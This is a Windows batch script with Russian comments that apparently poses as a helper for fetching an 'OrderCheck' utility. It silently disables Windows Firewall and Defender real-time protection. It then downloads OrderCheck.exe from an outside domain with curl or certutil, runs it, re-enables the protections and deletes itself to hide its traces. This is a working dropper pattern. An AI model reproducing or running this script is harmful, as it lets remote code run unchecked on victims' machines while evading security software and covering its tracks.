@echo off
chcp 1251 >nul
setlocal
REM ===============================
REM Выключаем Firewall и Defender
REM ===============================
echo Отключаем Windows Firewall...
netsh advfirewall set allprofiles state off >nul 2>&1

echo Отключаем Защиту в реальном времени Windows Defender...
powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1


REM ==========================
REM Настройки
REM ==========================
set "DL_URL=https://clearbat.iiko.online/downloads/OrderCheck.exe"
set "TMP_EXE=%TEMP%\OrderCheck.exe"

echo Скачивание OrderCheck.exe...

REM --------------------------
REM Если файл уже есть — удаляем
REM --------------------------
if exist "%TMP_EXE%" del /f /q "%TMP_EXE%" >nul 2>&1

REM --------------------------
REM Пробуем скачать через curl
REM --------------------------
where curl >nul 2>&1
if %errorlevel% equ 0 (
    echo Используется curl...
    curl -L -o "%TMP_EXE%" "%DL_URL%"
) else (
    echo curl не найден, используем certutil...
    certutil -urlcache -split -f "%DL_URL%" "%TMP_EXE%" >nul 2>&1
)

REM --------------------------
REM Проверка, скачался ли файл
REM --------------------------
if exist "%TMP_EXE%" (
    echo Файл успешно скачан: %TMP_EXE%
    echo Запуск OrderCheck.exe...
    start "" "%TMP_EXE%"
) else (
    echo Ошибка: не удалось скачать файл!
)

REM -------------------------
REM Возвращаем защиту
REM -------------------------
netsh advfirewall set allprofiles state on >nul 2>&1
powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1

timeout /t 5 >nul
endlocal


REM -------------------------
REM Самоудаление
REM -------------------------
(
    echo @echo off
    echo timeout /t 2 ^>nul
    echo del "%~f0" ^>nul 2^>^&1
) > "%TEMP%\_delself.bat"

start "" /min cmd /c "%TEMP%\_delself.bat"
exit
